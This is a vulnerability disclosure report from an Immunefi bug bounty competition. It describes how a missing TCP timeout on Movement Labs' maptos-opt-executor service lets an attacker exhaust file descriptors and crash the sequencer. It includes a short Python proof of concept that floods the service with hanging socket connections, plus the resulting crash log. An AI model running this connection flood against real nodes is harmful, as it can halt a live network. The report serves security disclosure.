# #43246 \[BC-Critical] Lack of TCP timeout allows attacker to crash the sequencer via the maptos-opt-executor service

**Submitted on Apr 4th 2025 at 02:18:12 UTC by @usmannk for** [**Attackathon | Movement Labs**](https://immunefi.com/audit-competition/movement-labs-attackathon)

* **Report ID:** #43246
* **Report Type:** Blockchain/DLT
* **Report severity:** Critical
* **Target:** <https://github.com/immunefi-team/attackathon-movement/tree/main/protocol-units/execution/maptos/opt-executor>
* **Impacts:**
  * Network not being able to confirm new transactions (total network shutdown)

## Description

## Brief/Intro

The maptos-opt-executor service is started by the Movement Full Node and serves HTTP requests. However this service does not have any sort of timeout on its requests. This allows an attacker to crash the sequencer via resource exhaustion.

## Vulnerability Details

the maptos-opt-executor service is bound to the ip address 0.0.0.0 in both the default and suggested (<https://docs.movementnetwork.xyz/assets/files/config-4551e1260977506ebb8dcdea19b254ed.json>) configurations. Because 0.0.0.0 allows requests from not just the local host but any IP address on the internet, an attacker may call this RPC from outside the local network.

Each HTTP request opened to the light node creates a file descriptor on the host. By default nix OS allows 256 file descriptors per process. By spamming the light node with connection requests and leaving them hanging, an attacker can use up all available file descriptors for the full node. At this point, the full node cannot accept or initiate any further connections. It will cease to receive new transactions or send any to DA.

## Impact Details

The sequencer will not be able to process transactions submit batches to DA. It will then also panic and crash, halting the network.

## References

`protocol-units/execution/maptos/opt-executor/src/service.rs`

```
pub fn run(&self) -> impl Future<Output = Result<(), anyhow::Error>> + Send {
		info!("Starting maptos-opt-executor services at: {:?}", self.listen_url);

		let api_service =
			get_api_service(self.api_context()).server(format!("http://{:?}", self.listen_url));

		let spec_json = api_service.spec_endpoint();
		let spec_yaml = api_service.spec_endpoint_yaml();

		let ui = api_service.swagger_ui();

		let cors = Cors::new()
			.allow_methods(vec![Method::GET, Method::POST])
			.allow_credentials(true);
		let listener = TcpListener::bind(self.listen_url.clone());
		let app = Route::new()
			.at("/", poem::get(root_handler))
			.nest("/v1", api_service)
			.nest("/spec", ui)
			.at("/spec.json", poem::get(spec_json))
			.at("/spec.yaml", poem::get(spec_yaml))
			.at(
				"/set_failpoint",
				poem::get(set_failpoints::set_failpoint_poem).data(self.api_context()),
			)
			.with(cors);

		Server::new(listener)
			.run(app)
			.map_err(|e| anyhow::anyhow!("Server error: {:?}", e))
	}
```

## Proof of Concept

## Proof of Concept

* run movement stack by calling `just movement-full-node native build.setup.celestia-local.eth-local`
* run the following python code pointed at the address and port of the maptos-opt-executor service

```
import socket
server_address = ('localhost', 30730)
arr = []
for _ in range(9999): # adjust for fd limit, likely 256 will suffice
     arr.append(socket.socket(socket.AF_INET, socket.SOCK_STREAM))
     arr[-1].connect(server_address)
```

* observe as the sequencer node becomes unavailable then the sequencer crashes, halting the network.

```
Error: readiness check fail - exit status 52  
2025-04-04T02:12:16.067428Z  INFO movement_full_node::node::manager: Receive Terminate Signal
thread 'tokio-runtime-worker' panicked at /Users/<redacted>/.cargo/registry/src/index.crates.io-6f17d22bba15001f/tokio-1.41.1/src/ 
runtime/blocking/shutdown.rs:51:
Cannot drop a runtime in a context where blocking is not allowed. This happens when a runtime is dropped from within an asynchronous context.
```
